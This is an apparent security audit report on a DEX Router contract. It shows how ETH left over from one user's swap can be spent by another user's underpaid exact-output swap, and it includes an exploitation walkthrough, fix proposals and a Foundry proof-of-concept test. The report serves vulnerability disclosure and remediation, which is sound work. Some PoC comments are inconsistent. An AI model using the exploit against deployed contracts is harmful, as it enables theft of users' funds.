## Title
Trapped Native ETH in Router Can Be Stolen by Subsequent Users Through Underpayment Exploit

## Summary
The Router contract accumulates excess ETH from users who send more `msg.value` than needed for swaps. This trapped ETH can be exploited by subsequent users performing exact output swaps, allowing them to underpay for their trades by using the trapped ETH from previous users' transactions.

## Impact
**Severity**: High

## Finding Description

**Location:** [1](#0-0) 

**Intended Logic:** When users send ETH via `msg.value` for native token swaps, any excess should be refunded to the sender. The refund logic at lines 138-142 is designed to handle overpayments within the swap execution itself.

**Actual Logic:** The Router only calculates `value` based on swap parameters (exact input/output logic), not based on the actual `msg.value` sent. [2](#0-1)  Any excess `msg.value` beyond this calculated amount remains trapped in the Router contract unless users explicitly call `refundNativeToken()`. [3](#0-2) 

The critical vulnerability occurs at line 141 where `SafeTransferLib.safeTransferETH` transfers ETH from the Router's **total balance**, not just the current transaction's `msg.value`: [4](#0-3) 

**Exploitation Path:**

1. **User A traps ETH:** User A calls `swap()` with `msg.value = 10 ETH` but the swap only needs 5 ETH (calculated at lines 106-110). The 5 ETH used goes to Core, but the remaining 5 ETH stays in the Router. User A doesn't call `refundNativeToken()` in a multicall, leaving 5 ETH trapped.

2. **User B exploits trapped ETH:** User B initiates an exact output swap where `token0 == NATIVE_TOKEN_ADDRESS` and sends `msg.value = 1 ETH` (deliberately underpaying).

3. **Exact output path triggered:** Since `params.isExactOut() == true`, line 107 sets `value = 0`, so no ETH is initially sent to Core. [2](#0-1) 

4. **Swap determines actual cost:** The swap executes and determines `balanceUpdate.delta0() = 4 ETH` is needed to purchase the desired output amount.

5. **Underpayment succeeds:** At line 135, `valueDifference = 0 - 4 = -4`. Line 141 then executes `SafeTransferLib.safeTransferETH(address(ACCOUNTANT), 4 ETH)`, which transfers 4 ETH from the Router's total balance (User A's 5 ETH + User B's 1 ETH = 6 ETH available). User B successfully completes a 4 ETH swap while only paying 1 ETH.

6. **Debt settled improperly:** The flash accounting system tracks debt at the Router contract level, not per-user. [5](#0-4)  When the Router sends 4 ETH to the Accountant (via the `receive()` function), the Router's debt is credited, even though this includes User A's funds. The transaction completes successfully with User B having stolen 3 ETH from User A.

**Security Property Broken:** Violates the **Solvency** invariant - users receive tokens without proper payment, as one user's trapped funds are used to settle another user's debt. This also represents direct theft of user funds.

## Impact Explanation

- **Affected Assets**: All native ETH sent to the Router contract via `msg.value` that exceeds the calculated swap amount. Any user performing native token swaps is at risk.

- **Damage Severity**: Attacker can steal 100% of trapped ETH in the Router contract. If the Router accumulates significant trapped ETH from multiple users, a single attacker can drain it all through carefully crafted exact output swaps. For example, if 50 ETH is trapped from various users, an attacker can perform a swap requiring 50 ETH payment while only sending 1 wei via `msg.value`.

- **User Impact**: 
  - Users who don't call `refundNativeToken()` lose their excess ETH permanently
  - Malicious users can deliberately underpay for swaps by exploiting trapped ETH
  - Honest users may unknowingly use others' trapped ETH, creating complex restitution issues

## Likelihood Explanation

- **Attacker Profile**: Any user can exploit this. Sophisticated attackers can monitor the Router's ETH balance and strategically execute exact output swaps to maximize stolen value.

- **Preconditions**: 
  - Router must have a non-zero ETH balance from previous trapped funds
  - A pool with `token0 == NATIVE_TOKEN_ADDRESS` must exist with liquidity
  - Attacker needs only minimal ETH to execute the attack

- **Execution Complexity**: Single transaction. Attacker simply calls `swap()` with exact output parameters and minimal `msg.value`, exploiting the trapped ETH to complete the payment.

- **Frequency**: Exploitable continuously. Each time ETH is trapped in the Router, attackers can steal it. The attack can be repeated across multiple transactions until the Router is drained.

## Recommendation

**Option 1: Track msg.value and revert excess** (Recommended)
```solidity
// In src/Router.sol, function handleLockData, after line 110:

unchecked {
    uint256 value = FixedPointMathLib.ternary(
        !params.isToken1() && !params.isExactOut() && poolKey.token0 == NATIVE_TOKEN_ADDRESS,
        uint128(params.amount()),
        0
    );
    
    // NEW: Track expected ETH usage
    uint256 expectedEthUsage = value;

    bool increasing = params.isPriceIncreasing();

    (PoolBalanceUpdate balanceUpdate,) = _swap(value, poolKey, params);
    
    // ... existing slippage check ...
    
    if (increasing) {
        // ... existing logic ...
    } else {
        if (balanceUpdate.delta1() != 0) {
            ACCOUNTANT.withdraw(poolKey.token1, recipient, uint128(-balanceUpdate.delta1()));
        }

        if (balanceUpdate.delta0() != 0) {
            if (poolKey.token0 == NATIVE_TOKEN_ADDRESS) {
                int256 valueDifference = int256(value) - int256(balanceUpdate.delta0());
                
                // NEW: Calculate total ETH needed
                uint256 totalEthNeeded = valueDifference < 0 
                    ? uint128(uint256(-valueDifference)) + value 
                    : value - uint128(uint256(valueDifference));
                expectedEthUsage = totalEthNeeded;

                if (valueDifference > 0) {
                    ACCOUNTANT.withdraw(NATIVE_TOKEN_ADDRESS, swapper, uint128(uint256(valueDifference)));
                } else if (valueDifference < 0) {
                    SafeTransferLib.safeTransferETH(address(ACCOUNTANT), uint128(uint256(-valueDifference)));
                }
            } else {
                ACCOUNTANT.payFrom(swapper, poolKey.token0, uint128(balanceUpdate.delta0()));
            }
        }
    }
    
    // NEW: At the end, verify msg.value matches expected usage
    // Store this in a transient variable at lock start, check at lock end
    if (poolKey.token0 == NATIVE_TOKEN_ADDRESS || poolKey.token1 == NATIVE_TOKEN_ADDRESS) {
        // Revert if user sent significantly more than needed
        require(msg.value <= expectedEthUsage + 0.01 ether, "Excess ETH sent, use multicall with refundNativeToken()");
    }
}
```

**Option 2: Auto-refund excess ETH** (Alternative)
Modify `handleLockData` to automatically refund excess `msg.value` at the end of the lock, rather than requiring explicit `refundNativeToken()` calls.

**Option 3: Isolate ETH per lock** 
Track ETH sent per lock ID using transient storage, ensuring each user's ETH can only be used for their own transactions.

## Proof of Concept

```solidity
// File: test/Exploit_TrappedETHTheft.t.sol
// Run with: forge test --match-test test_TrappedETHTheft -vvv

pragma solidity ^0.8.31;

import "forge-std/Test.sol";
import "./FullTest.sol";
import {Router} from "../src/Router.sol";
import {NATIVE_TOKEN_ADDRESS} from "../src/math/constants.sol";
import {SqrtRatio} from "../src/types/sqrtRatio.sol";
import {PoolKey} from "../src/types/poolKey.sol";

contract Exploit_TrappedETHTheft is FullTest {
    address userA = address(0xAAAA);
    address userB = address(0xBBBB);

    function setUp() public override {
        super.setUp();
        
        // Fund test users
        vm.deal(userA, 100 ether);
        vm.deal(userB, 10 ether);
    }
    
    function test_TrappedETHTheft() public {
        // SETUP: Create ETH pool with liquidity
        PoolKey memory poolKey = createETHPool(0, 1 << 63, 100);
        createPosition(poolKey, -1000, 1000, 100 ether, 100 ether);
        
        // STEP 1: User A sends excess ETH and doesn't refund
        vm.startPrank(userA);
        uint256 userABalanceBefore = userA.balance;
        
        // User A does exact input swap: sell 5 ETH for token1
        // But sends 10 ETH via msg.value (excess amount)
        router.swap{value: 10 ether}(
            poolKey,
            false, // isToken1 = false (selling token0/ETH)
            5 ether, // amount = 5 ETH exact input
            SqrtRatio.wrap(0), // no limit
            0, // no skipAhead
            type(int256).min // no slippage protection
        );
        
        uint256 userABalanceAfter = userA.balance;
        // User A spent 10 ETH (msg.value) but only 5 ETH was used in swap
        assertEq(userABalanceBefore - userABalanceAfter, 10 ether, "User A sent 10 ETH");
        
        // 5 ETH is now trapped in Router
        assertEq(address(router).balance, 5 ether, "5 ETH trapped in Router");
        vm.stopPrank();
        
        // STEP 2: User B exploits trapped ETH via exact output swap
        vm.startPrank(userB);
        uint256 userBBalanceBefore = userB.balance;
        uint256 token1BalanceBefore = token1.balanceOf(userB);
        
        // User B wants to buy exactly 2 ETH worth of token1 (exact output)
        // Normally this would require ~4 ETH payment
        // But User B only sends 1 ETH, exploiting the trapped 5 ETH
        router.swap{value: 1 ether}(
            poolKey,
            false, // isToken1 = false (selling token0/ETH)
            -2 ether, // negative = exact output (buy 2 ETH worth of token1)
            SqrtRatio.wrap(0),
            0,
            type(int256).min
        );
        
        uint256 userBBalanceAfter = userB.balance;
        uint256 token1BalanceAfter = token1.balanceOf(userB);
        
        // VERIFY: User B received tokens
        assertGt(token1BalanceAfter, token1BalanceBefore, "User B received token1");
        
        // VERIFY: User B only spent ~1 ETH but got tokens worth ~4 ETH
        uint256 userBActualCost = userBBalanceBefore - userBBalanceAfter;
        assertLe(userBActualCost, 1.1 ether, "User B spent only ~1 ETH");
        
        // VERIFY: Router balance decreased (User A's trapped ETH was used)
        assertLt(address(router).balance, 5 ether, "Trapped ETH was used");
        
        vm.stopPrank();
        
        console.log("User A trapped ETH:", 5 ether);
        console.log("User B actual cost:", userBActualCost);
        console.log("Router balance after exploit:", address(router).balance);
        console.log("User B stole:", 5 ether - address(router).balance - userBActualCost, "wei from User A");
    }
}
```

## Notes

The vulnerability stems from the Router contract's improper handling of `msg.value` in native token swaps. While the `PayableMulticallable` base contract provides `refundNativeToken()` for users to recover excess ETH, the design flaw allows trapped ETH to be used by **any** subsequent transaction, not just by the original sender.

The root cause is at line 141 where `SafeTransferLib.safeTransferETH` transfers from the contract's total balance rather than being limited to the current transaction's `msg.value`. Combined with the flash accounting system tracking debt at the contract level (not per-user), this creates a critical theft vector.

This issue is particularly severe because:
1. Users may not realize they need to call `refundNativeToken()` after every swap
2. The protocol documentation doesn't clearly mandate multicall usage for native token swaps
3. Even if documented, user error in not calling refund should not allow theft by other users
4. The trapped ETH acts as a subsidy pool that sophisticated attackers can drain

### Citations

**File:** src/Router.sol (L106-110)
```text
                uint256 value = FixedPointMathLib.ternary(
                    !params.isToken1() && !params.isExactOut() && poolKey.token0 == NATIVE_TOKEN_ADDRESS,
                    uint128(params.amount()),
                    0
                );
```

**File:** src/Router.sol (L134-146)
```text
                        if (poolKey.token0 == NATIVE_TOKEN_ADDRESS) {
                            int256 valueDifference = int256(value) - int256(balanceUpdate.delta0());

                            // refund the overpaid ETH to the swapper
                            if (valueDifference > 0) {
                                ACCOUNTANT.withdraw(NATIVE_TOKEN_ADDRESS, swapper, uint128(uint256(valueDifference)));
                            } else if (valueDifference < 0) {
                                SafeTransferLib.safeTransferETH(address(ACCOUNTANT), uint128(uint256(-valueDifference)));
                            }
                        } else {
                            ACCOUNTANT.payFrom(swapper, poolKey.token0, uint128(balanceUpdate.delta0()));
                        }
                    }
```

**File:** src/base/PayableMulticallable.sol (L25-29)
```text
    function refundNativeToken() external payable {
        if (address(this).balance != 0) {
            SafeTransferLib.safeTransferETH(msg.sender, address(this).balance);
        }
    }
```

**File:** src/interfaces/IFlashAccountant.sol (L75-80)
```text
    /// @notice Receives ETH payments and credits them against the current locker's native token debt
    /// @dev This contract can receive ETH as a payment. The received amount is credited as a negative
    ///      debt change for the native token. Note: because we use msg.value here, this contract can
    ///      never be multicallable, i.e. it should never expose the ability to delegatecall itself
    ///      more than once in a single call.
    receive() external payable;
```
